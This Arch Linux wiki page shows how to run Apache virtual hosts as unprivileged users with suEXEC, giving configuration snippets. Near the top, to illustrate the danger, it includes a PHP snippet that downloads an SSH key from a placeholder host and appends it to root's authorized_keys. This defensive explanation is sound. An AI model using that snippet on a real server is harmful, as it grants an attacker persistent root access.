Apache, suEXEC and Virtual Hosts
================================

  
 This document describes how to use Apache's suEXEC module in order to
have virtual hosts running as a unprivileged user. Generally it's good
practice not to let any kind of webspace have superuser privileges like
this rather brutal PHP example shows:

       <?php
         # of course this link doesn't lead anywhere
         $rsa_key = file('http://yourhost.homeip.net/id_rsa.pub');
         exec("cat ${rsa_key[[0]]} >>/root/.ssh/authorized_keys");
       ?>

You get the point, do you? To prevent this, never let any virtual host
have write access anywhere but in its own home directory or
DocumentRoot. Unfortunately this method requires Apache to run as
superuser in order to be able to become another user but it's not a big
deal since you do not need to run in the default DocumentRoot as
superuser too.

You should also consider using suEXEC if you intend to have several FTP
accounts pointing to those webspaces which need write permissions while
the files still can be read by Apache.

+--------------------------------------------------------------------------+
| Contents                                                                 |
| --------                                                                 |
|                                                                          |
| -   1 Prerequisites                                                      |
| -   2 Adding the suEXEC module to Apache                                 |
| -   3 Setting up a virtual Host to use suEXEC                            |
| -   4 "Disabling" default DocumentRoot                                   |
| -   5 Finishing up                                                       |
| -   6 References                                                         |
+--------------------------------------------------------------------------+

Prerequisites
-------------

-   you should be familiar with basic configuration of Apache
    -   especially virtual hosts

-   superuser access to the target box
-   knowledge about adding users
-   can work with pacman

Adding the suEXEC module to Apache
----------------------------------

-   load the suEXEC module in /etc/httpd/conf/httpd.conf like this:

    LoadModule suexec_module        lib/apache/mod_suexec.so

-   make sure Apache's default DocumentRoot does not run as superuser
    either!

    User http
    Group http

Setting up a virtual Host to use suEXEC
---------------------------------------

One way to do it is directly in /etc/httpd/conf/httpd.conf but I suggest
to use a separate file if you intend to create more than just a couple
of virtual hosts. Either way, a virtual host that is supposed to use
suEXEC may look something like this:

    <VirtualHost 192.168.0.1:80>
            ServerName myhost
            ServerAlias  myhost.localdomain
            # this is where requests for / go
            DocumentRoot /home/www/vhosts/myhost.localdomain/htdocs

            # here you tell which user (myhost) and group (ftponly) Apache should use
            SuexecUserGroup myhost ftponly

            # the following are optional but might be of use for you
            ScriptAlias /cgi-bin/ /home/www/vhosts/myhost.localdomain/htdocs/cgi-bin
            php_admin_value open_basedir /home/www/vhosts/myhost.localdomain/htdocs
            php_admin_value upload_tmp_dir  /home/www/vhosts/myhost.localdomain/tmp
            # Safe mode will be removed as of PHP 6. You may want to not enable it.
            php_admin_flag safe_mode On
            ErrorDocument 404 /home/www/vhosts/myhost.localdomain
            <Directory "/home/www/vhosts/myhost.localdomain/htdocs">
                    AllowOverride None
                    Order allow,deny
                    Allow from all
                    Options +SymlinksIfOwnerMatch +Includes
            </Directory>
    </VirtualHost>

Note that we set upload_tmp_dir to a folder that is outside the document
root of your web site (not
/home/www/vhosts/myhost.localdomain/htdocs/tmp). It should also be not
readable or writable by any other system users. This is for security
reasons: this way it cannot be modified or overwritten while PHP is
processing it.

"Disabling" default DocumentRoot
--------------------------------

To further harden your setup you can disable the default DocumentRoot in
order to not have Apache execute anything as the superuser itself runs
as. This procedure does not really disable it, rather points it
somewhere where it's not remotely accessible anymore. It can be easily
achieved by replacing your default ServerName with the following:

    ServerName localhost:80

Finishing up
------------

Every time you change default configuration parameters you need to
restart httpd (Apache) to make them take effect.

References
----------

-   more in depth information about suEXEC:
    http://httpd.apache.org/docs/suexec.html
-   same about VirtualHosts:
    http://httpd.apache.org/docs/vhosts/index.html

Retrieved from
"https://wiki.archlinux.org/index.php?title=Apache,_suEXEC_and_Virtual_Hosts&oldid=235023"

Category:

-   Web Server
